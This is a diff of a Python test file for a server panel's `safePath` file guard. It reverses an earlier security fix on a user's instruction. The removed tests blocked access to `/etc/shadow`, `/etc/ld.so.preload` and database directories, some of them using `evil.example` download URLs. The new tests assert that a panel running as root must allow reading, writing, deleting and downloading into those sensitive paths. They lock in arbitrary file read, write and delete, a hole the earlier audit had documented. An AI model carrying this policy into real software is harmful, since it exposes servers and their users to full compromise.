@@ -1,29 +1,27 @@
 # coding: utf-8
-"""P0-3 之二：文件接口 safePath 缺口 + 删除黑名单缺口 的回归守卫。
+"""文件路径策略守卫：**放开**口径（2026-10-28 用户裁定）+ 结构接线。
 
-测评报告 P0-3 的第二个口子（三.2 / 三.3 / 三.4 / 三.5）：
+## 政策
 
-1. `/files/download_file`：`path` 未过 `safePath` 就 `os.path.abspath` 并拼
-   `filename` 投递异步下载任务 —— `path=/etc` + `filename=ld.so.preload`
-   可把攻击者 URL 内容写进任意目录（面板以 root 运行）。
-2. `/files/get_dir`：`file.getAllDirList/getDirList` 全程无校验 → 任意目录列举。
-3. `/files/check_exists_files`、`/files/get_dir_size`、`/files/file_access`：
-   文件存在性 / 大小 / 权限预言机，均无 `safePath`。
-4. 删除黑名单只拦 `/www/server` **本体**，`/www/server/mysql`、`/www/server/data`
-   等关键数据目录可被文件管理器直接删除。
+用户明确要求：「不要拦截，所有目录都允许用户访问」。因此 `file.safePath()` 不再按
+目录黑名单拒绝 —— 面包屑点 `/www`、`/www/server`、`/etc` 或面板自身目录都必须能进。
+`safePath` 只保留**输入本身非法**的拦截（空 / 非字符串 / NUL / 无法词法规范化），
+那几条是防崩溃（拼 shell 与文件 API 会抛异常），不是权限。
 
-本轮修法与断言：
-- 读入口（get_dir / check_exists_files / get_dir_size / file_access）补 `safePath(path)`；
-- 写/删/下载落盘（download_file / fileDelete / dirDelete）走 `safePath(path, write=True)`，
-  由 `safePath` 新增的 `_SENSITIVE_DATA_PREFIXES`（写模式）拒绝数据库/面板数据目录。
+本文件原来断言的是「越界路径必须被拒」（P0-3 之二那轮的加固）。政策反转后，
+那些断言按**新口径**逐条翻转为「必须放行」，继续作为回归守卫存在：
+想重新收紧，把 `web/utils/file.py::ALLOW_ALL_PATHS` 置 False，并把本文件的
+`TestPathPolicyAllowsEverything` 改回拒绝断言。
 
-断言分三层：
-- **直测** `safePath`：越界路径拒、正常路径放行、`/www/server` 下正常环境目录（php/nginx）
-  写模式仍放行（证明没有一刀切封整个 `/www/server`）；
-- **行为**：AST 抽出路由函数真调用，越界请求必须被拒（正对照：正常站点目录放行）；
-- **结构**：源码里每个入口确实调了 `safePath`，防「检查写在 `if False:` 里」。
+## 断言分三层
 
-所有越界路径在 `safePath` 处即返回，不会触达真实文件系统 —— 用例不做任何真删/真写。
+1. **直测** `safePath`：敏感文件 / 系统根 / 面板自身资产 / 数据库目录，读写两种模式一律放行；
+   非法输入（空 / None / NUL / bytes）仍拒。
+2. **行为**：AST 抽出路由函数真调用，`/etc`、`/etc/shadow` 这类路径不得再返回
+   `FILE_DANGER` / `FILE_SENSITIVE_DIR`。破坏性路由（删/下载）只用**不存在的路径**，
+   保证用例不会真删/真写测试机上的文件。
+3. **结构**：各入口仍调用 `safePath`（保留单一收口点），且 `ALLOW_ALL_PATHS` 开关与
+   黑名单判定代码都在（可回溯收紧）。
 """
 import ast
 import logging
@@ -110,7 +108,7 @@ def _load_utils_file():
     """执行 file.py 的 safePath / fileDelete / dirDelete（+ 黑名单常量）。"""
     nodes = _keep_nodes(
         FILE_PY,
-        assigns=('_SENSITIVE_PATHS', '_SENSITIVE_EXACT',
+        assigns=('ALLOW_ALL_PATHS', '_SENSITIVE_PATHS', '_SENSITIVE_EXACT',
                  '_SENSITIVE_DATA_PREFIXES', '_PANEL_SENSITIVE_REL'),
         funcs=('_posix_norm', 'safePath', 'fileDelete', 'dirDelete'),
     )
@@ -208,86 +206,86 @@ def _calls_in_func(name, callee_text):
     raise AssertionError('未找到函数 %s' % name)
 
 
-# 需要写模式（safePath(write=True)）才拒绝的关键数据目录
+# 原来写模式要拒绝的关键数据目录（现在是「必须放行」的正向清单）
 _DATA_PREFIXES = (
     '/www/server/data', '/www/server/mysql', '/www/server/mariadb',
     '/www/server/redis', '/www/server/valkey', '/www/server/pgsql',
     '/www/server/postgresql', '/www/server/panel', '/www/server/yufeng_panel',
 )
 
+# 原黑名单里的敏感系统路径（现在是正向清单）
+_SENSITIVE_FILES = (
+    '/etc/passwd', '/etc/shadow', '/etc/gshadow', '/etc/sudoers', '/etc/sudoers.d',
+    '/etc/ssh/sshd_config', '/root/.ssh/authorized_keys', '/etc/ld.so.preload',
+    '/etc/cron.d/evil', '/var/spool/cron/root',
+)
 
-class TestSafePathSensitiveDirs(unittest.TestCase):
-    """直测 safePath：越界/敏感路径拒，正常运维路径放行。"""
+
+class TestPathPolicyAllowsEverything(unittest.TestCase):
+    """直测 safePath：**所有目录都放行**（政策口径），只拒非法输入。"""
 
     @classmethod
     def setUpClass(cls):
         cls.ns = _load_utils_file()
         cls.safePath = staticmethod(cls.ns['safePath'])
 
-    # ---- 越界：读也要拒 ----
+    def test_01_allows_sensitive_system_files(self):
+        for p in _SENSITIVE_FILES:
+            for write in (False, True):
+                ok, reason = self.safePath(p, write=write)
+                self.assertTrue(ok, 'write=%s 时 %s 被拦: %s（政策要求全放行）'
+                                % (write, p, reason))
 
-    def test_01_etc_rejected(self):
-        ok, reason = self.safePath('/etc')
-        self.assertFalse(ok, '/etc 未被拒绝')
-        self.assertEqual(reason, 'FILE_DANGER')
+    def test_02_allows_system_roots(self):
+        for p in ('/', '/etc', '/www', '/www/server', '/root', '/usr', '/var'):
+            for write in (False, True):
+                ok, reason = self.safePath(p, write=write)
+                self.assertTrue(ok, 'write=%s 时 %s 被拦: %s' % (write, p, reason))
 
-    def test_02_etc_ld_so_preload_rejected_read_and_write(self):
-        for write in (False, True):
-            ok, reason = self.safePath('/etc/ld.so.preload', write=write)
-            self.assertFalse(ok, 'write=%s 时 /etc/ld.so.preload 未被拒绝' % write)
-            self.assertEqual(reason, 'FILE_DANGER')
-
-    # ---- 删除黑名单缺口：写/删/下载落盘拒关键数据目录 ----
-
-    def test_03_all_data_prefixes_rejected_write(self):
+    def test_03_allows_data_prefixes_read_and_write(self):
         for p in _DATA_PREFIXES:
-            ok, reason = self.safePath(p, write=True)
-            self.assertFalse(ok, '%s 写模式未被拒绝' % p)
-            self.assertEqual(reason, 'FILE_SENSITIVE_DIR', p)
+            for write in (False, True):
+                ok, reason = self.safePath(p, write=write)
+                self.assertTrue(ok, 'write=%s 时 %s 被拦: %s' % (write, p, reason))
 
-    def test_04_data_prefix_subpath_rejected_write(self):
+    def test_04_allows_data_prefix_subpaths(self):
         for p in ('/www/server/mysql/data/ibdata1',
                   '/www/server/data/panel.db',
-                  '/www/server/mariadb/mysql/ib_logfile0'):
+                  '/www/server/mariadb/mysql/ib_logfile0',
+                  '/www/server/mysql/'):
             ok, reason = self.safePath(p, write=True)
-            self.assertFalse(ok, '%s 写模式未被拒绝' % p)
-            self.assertEqual(reason, 'FILE_SENSITIVE_DIR', p)
+            self.assertTrue(ok, '%s 被拦: %s' % (p, reason))
 
-    def test_05_data_prefix_with_trailing_slash_rejected_write(self):
-        ok, _ = self.safePath('/www/server/mysql/', write=True)
-        self.assertFalse(ok, '带尾斜杠的 /www/server/mysql/ 写模式未被拒绝')
+    def test_05_allows_root_dotdot_normalized(self):
+        """`/etc/passwd/..` 词法上是 `/etc`：放行（不再有目录黑名单）。"""
+        ok, reason = self.safePath('/etc/passwd/..')
+        self.assertTrue(ok, reason)
 
-    # ---- 正对照：正常运维路径仍放行 ----
+    def test_06_allows_wwwroot_and_env_dirs(self):
+        for p in ('/www/wwwroot/site/a.txt', '/www/server/php/72/bin/php',
+                  '/www/server/nginx/conf/nginx.conf', '/www/server/mysql_conf/x.cnf'):
+            for write in (False, True):
+                ok, reason = self.safePath(p, write=write)
+                self.assertTrue(ok, '%s 被拦: %s' % (p, reason))
 
-    def test_06_wwwroot_allowed_read_and_write(self):
-        for write in (False, True):
-            ok, reason = self.safePath('/www/wwwroot/site/a.txt', write=write)
-            self.assertTrue(ok, 'write=%s 时正常站点文件被误拒: %s' % (write, reason))
-
-    def test_07_server_env_dirs_allowed_write(self):
-        """没有一刀切封整个 /www/server：php/nginx 等环境目录写模式必须放行。"""
-        for p in ('/www/server/php/72/bin/php', '/www/server/nginx/conf/nginx.conf',
-                  '/www/server/mysql_conf/x.cnf'):
-            ok, reason = self.safePath(p, write=True)
-            self.assertTrue(ok, '%s 被误拒: %s' % (p, reason))
-
-    def test_08_data_prefix_read_not_blocked(self):
-        """数据目录的**读**（浏览目录内容）不封，避免破坏插件/环境目录管理。"""
-        ok, reason = self.safePath('/www/server/mysql')
-        self.assertTrue(ok, '读模式不应拦 /www/server/mysql: %s' % reason)
+    def test_07_still_rejects_malformed_input(self):
+        """非法输入仍拒：这些会在拼 shell / 文件 API 时抛异常或截断，不是权限问题。"""
+        for bad in ('', None, '/tmp/a\x00b', b'/tmp/x', 123):
+            ok, reason = self.safePath(bad)
+            self.assertFalse(ok, '%r 应被拒' % (bad,))
+            self.assertEqual(reason, 'FILE_DANGER')
 
 
-class TestRouteGuards(unittest.TestCase):
-    """行为层：AST 抽出路由函数真调用，越界请求必须被拒。"""
+class TestRouteDoesNotBlockAnyDir(unittest.TestCase):
+    """行为层：AST 抽出路由函数真调用，任何目录都不得被 safePath 拦下。"""
 
     @classmethod
     def setUpClass(cls):
         cls.ns = _load_utils_file()
         cls.file = _FileShim(cls.ns)
 
-        # download_file 通过 `from utils.urlguard import validate_url` 取校验器：
-        # 用替身固定为「放行」，这样一旦路由漏了 safePath，就会一路走到 addTaskByDownload
-        # 并返回成功 —— 让漏修在断言里暴露成 status=True（而不是被 URL 校验失败掩盖）。
+        # download_file 走 `from utils.urlguard import validate_url`：替身固定放行，
+        # 这样断言才能落到 safePath 这一层（不被 URL 校验失败掩盖）。
         fake_mod = types.ModuleType('utils.urlguard')
         fake_mod.validate_url = lambda url, resolve=False: (True, 'ok', {})
         cls._saved = sys.modules.get('utils.urlguard')
@@ -300,146 +298,91 @@ class TestRouteGuards(unittest.TestCase):
         else:
             sys.modules['utils.urlguard'] = cls._saved
 
-    def _reject(self, r, reason):
-        self.assertFalse(r['status'], '越界请求未被拒绝: %r' % (r,))
-        self.assertEqual(r['msg'], reason, r)
+    def _assert_not_blocked(self, r, label):
+        """断言没有被 safePath 拦（其它失败原因不影响本断言）。"""
+        msg = str(r.get('msg') if isinstance(r, dict) else r)
+        self.assertNotIn('FILE_DANGER', msg, '%s 仍被 safePath 拦: %r' % (label, r))
+        self.assertNotIn('FILE_SENSITIVE_DIR', msg, '%s 仍被写模式拦: %r' % (label, r))
 
-    # ---- get_dir ----
+    # ---- 读入口 ----
 
-    def test_10_get_dir_rejects_etc(self):
-        # os.path.exists 固定为 True，绕开「不存在则回退 wwwroot」的兜底分支
+    def test_10_get_dir_etc(self):
         os_shim = types.SimpleNamespace(
             path=types.SimpleNamespace(exists=lambda p: True))
-        fn = _load_route('get_dir', self.file,
-                         _Req({'path': '/etc'}), os_shim=os_shim)
-        self._reject(fn(), 'FILE_DANGER')
+        fn = _load_route('get_dir', self.file, _Req({'path': '/etc'}), os_shim=os_shim)
+        r = fn()
+        self._assert_not_blocked(r, 'get_dir(/etc)')
+        self.assertIn('count', r, 'get_dir(/etc) 应返回目录列表: %r' % (r,))
 
-    def test_11_get_dir_allows_wwwroot(self):
-        d = tempfile.mkdtemp(prefix='yf_safepath_site_')
+    def test_11_get_dir_www_and_server(self):
+        """用户点名的两条面包屑：/www 与 /www/server 必须能打开。"""
+        os_shim = types.SimpleNamespace(
+            path=types.SimpleNamespace(exists=lambda p: True))
+        for p in ('/www', '/www/server', '/'):
+            fn = _load_route('get_dir', self.file, _Req({'path': p}), os_shim=os_shim)
+            r = fn()
+            self._assert_not_blocked(r, 'get_dir(%s)' % p)
+            self.assertIn('count', r, 'get_dir(%s) 应返回目录列表: %r' % (p, r))
+
+    def test_12_get_dir_real_wwwroot(self):
+        d = tempfile.mkdtemp(prefix='yf_pathpolicy_')
         self.addCleanup(__import__('shutil').rmtree, d, True)
         fn = _load_route('get_dir', self.file, _Req({'path': d}))
         r = fn()
         self.assertIsNot(r.get('status'), False, '正常目录被误拒: %r' % (r,))
         self.assertIn('count', r)
 
-    def test_11b_get_dir_allows_root(self):
-        """正对照：文件管理器「根目录」入口 getFiles('/') 只读列举必须放行。
-
-        P0-3 之二给 get_dir 加 safePath 后把 '/' 一并拒了（safePath 把根视为敏感），
-        面包屑根节点打不开。本用例钉住那个特例：去掉它即变红。
-        """
-        os_shim = types.SimpleNamespace(
-            path=types.SimpleNamespace(exists=lambda p: True))
-        fn = _load_route('get_dir', self.file, _Req({'path': '/'}), os_shim=os_shim)
-        r = fn()
-        self.assertIsNot(r.get('status'), False, '根目录被误拒: %r' % (r,))
-        self.assertIn('count', r)
-
-    def test_11c_get_dir_root_exception_does_not_leak(self):
-        """`/` 特例不得外溢：/etc、/root/.ssh 仍按 safePath 结果拒绝。"""
-        os_shim = types.SimpleNamespace(
-            path=types.SimpleNamespace(exists=lambda p: True))
-        for p in ('/etc', '/root/.ssh'):
-            fn = _load_route('get_dir', self.file, _Req({'path': p}), os_shim=os_shim)
-            self._reject(fn(), 'FILE_DANGER')
-
-    def test_11d_get_dir_follows_safepath_for_data_dir(self):
-        """`/www/server/mysql` 读模式 safePath 放行 -> get_dir 仍放行（未误伤）。"""
-        ok, _reason = self.ns['safePath']('/www/server/mysql')
-        self.assertTrue(ok, '前置：safePath 读模式应放行 /www/server/mysql')
-        os_shim = types.SimpleNamespace(
-            path=types.SimpleNamespace(exists=lambda p: True))
-        fn = _load_route('get_dir', self.file,
-                         _Req({'path': '/www/server/mysql'}), os_shim=os_shim)
-        r = fn()
-        self.assertIsNot(r.get('status'), False, 'get_dir 未跟随 safePath 结果: %r' % (r,))
-
-    # ---- check_exists_files ----
-
-    def test_12_check_exists_rejects_etc(self):
+    def test_13_check_exists_etc(self):
         fn = _load_route('check_exists_files', self.file, _Req({'dfile': '/etc'}))
-        self._reject(fn(), 'FILE_DANGER')
+        self._assert_not_blocked(fn(), 'check_exists_files(/etc)')
 
-    def test_13_check_exists_rejects_sfile(self):
-        d = tempfile.mkdtemp(prefix='yf_safepath_src_')
-        self.addCleanup(__import__('shutil').rmtree, d, True)
-        fn = _load_route('check_exists_files', self.file,
-                         _Req({'dfile': d, 'sfile': '/etc/shadow'}))
-        self._reject(fn(), 'FILE_DANGER')
-
-    # ---- get_dir_size ----
-
-    def test_14_get_dir_size_rejects_etc(self):
+    def test_14_get_dir_size_and_file_access(self):
         fn = _load_route('get_dir_size', self.file, _Req({'path': '/etc'}))
-        self._reject(fn(), 'FILE_DANGER')
+        self._assert_not_blocked(fn(), 'get_dir_size(/etc)')
+        fn2 = _load_route('file_access', self.file, _Req({'filename': '/etc/shadow'}))
+        self._assert_not_blocked(fn2(), 'file_access(/etc/shadow)')
 
-    # ---- file_access ----
+    # ---- 写/删/下载：只用不存在的路径，绝不真删真写 ----
 
-    def test_15_file_access_rejects_shadow(self):
-        fn = _load_route('file_access', self.file, _Req({'filename': '/etc/shadow'}))
-        self._reject(fn(), 'FILE_DANGER')
+    def test_15_file_delete_and_dir_delete_not_blocked(self):
+        for p in ('/www/server/mysql/yf_policy_probe_absent.cnf',
+                  '/www/server/data/yf_policy_probe_absent'):
+            self._assert_not_blocked(self.file.fileDelete(p), 'fileDelete(%s)' % p)
+            self._assert_not_blocked(self.file.dirDelete(p), 'dirDelete(%s)' % p)
 
-    # ---- download_file（写/落盘） ----
-
-    def test_16_download_file_rejects_etc(self):
+    def test_16_download_file_not_blocked(self):
         fn = _load_route('download_file', self.file, _Req({
-            'url': 'http://evil.example/ld.so.preload',
-            'path': '/etc', 'filename': 'ld.so.preload'}))
-        self._reject(fn(), 'FILE_DANGER')
-
-    def test_17_download_file_rejects_mysql_write(self):
-        fn = _load_route('download_file', self.file, _Req({
-            'url': 'http://evil.example/x', 'path': '/www/server/mysql',
-            'filename': 'evil.txt'}))
-        self._reject(fn(), 'FILE_SENSITIVE_DIR')
-
-    def test_18_download_file_allows_wwwroot(self):
-        d = tempfile.mkdtemp(prefix='yf_safepath_dl_')
-        self.addCleanup(__import__('shutil').rmtree, d, True)
-        fn = _load_route('download_file', self.file, _Req({
-            'url': 'http://ok.example/x', 'path': d, 'filename': 'x.txt'}))
-        r = fn()
-        self.assertTrue(r['status'], '正常下载目录被误拒: %r' % (r,))
-
-    # ---- delete / delete_dir（走 fileDelete / dirDelete 的 safePath(write=True)） ----
-
-    def test_19_file_delete_rejects_mysql(self):
-        r = self.file.fileDelete('/www/server/mysql/my.cnf')
-        self._reject(r, 'FILE_SENSITIVE_DIR')
-
-    def test_20_dir_delete_rejects_data(self):
-        r = self.file.dirDelete('/www/server/data')
-        self._reject(r, 'FILE_SENSITIVE_DIR')
-
-    def test_21_file_delete_rejects_etc(self):
-        r = self.file.fileDelete('/etc/ld.so.preload')
-        self._reject(r, 'FILE_DANGER')
+            'url': 'http://ok.example/x', 'path': '/www/server/mysql',
+            'filename': 'x.txt'}))
+        self._assert_not_blocked(fn(), 'download_file -> /www/server/mysql')
 
 
 class TestStructuralWiring(unittest.TestCase):
-    """结构层：源码里每个入口确实调了 safePath（防「检查写在 if False: 里」）。"""
+    """结构层：各入口仍调 safePath（单一收口点）+ 放宽是可逆开关。"""
 
     def test_30_read_entries_call_safepath(self):
         for fn in ('check_exists_files', 'get_dir', 'get_dir_size', 'file_access'):
             self.assertTrue(_calls_in_func(fn, 'file.safePath('),
-                            '%s 未走 safePath' % fn)
+                            '%s 未走 safePath（收口点丢了）' % fn)
 
     def test_31_write_entry_calls_safepath_write(self):
         self.assertTrue(_calls_in_func('download_file', 'file.safePath(path, write=True)'),
                         'download_file 未以写模式过 safePath')
 
-    def test_32_safepath_has_sensitive_write_prefixes(self):
+    def test_32_policy_switch_is_reversible(self):
+        """`ALLOW_ALL_PATHS` 开关 + 黑名单判定代码必须都在，方便日后重新收紧。"""
         src = _read(FILE_PY)
-        self.assertIn('_SENSITIVE_DATA_PREFIXES', src)
+        self.assertIn('ALLOW_ALL_PATHS = True', src, '政策开关常量不存在')
+        self.assertIn('_SENSITIVE_DATA_PREFIXES', src, '关键数据目录黑名单被删了')
+        self.assertIn('_PANEL_SENSITIVE_REL', src, '面板自身资产黑名单被删了')
         tree = ast.parse(src)
         body = ''
         for node in ast.walk(tree):
             if isinstance(node, ast.FunctionDef) and node.name == 'safePath':
                 lines = src.splitlines()
-                body = '\n'.join(lines[node.lineno - 1:node.end_lineno])
-        self.assertIn('if write:', body, 'safePath 未使用 write 参数区分写模式')
-        self.assertIn('_SENSITIVE_DATA_PREFIXES', body,
-                      'safePath 写模式未检查关键数据目录前缀')
+                body = chr(10).join(lines[node.lineno - 1:node.end_lineno])
+        self.assertIn('if write:', body, 'safePath 的写模式判定被整段删了')
+        self.assertIn('_SENSITIVE_DATA_PREFIXES', body, '写模式判定没保留')
 
 
 if __name__ == '__main__':
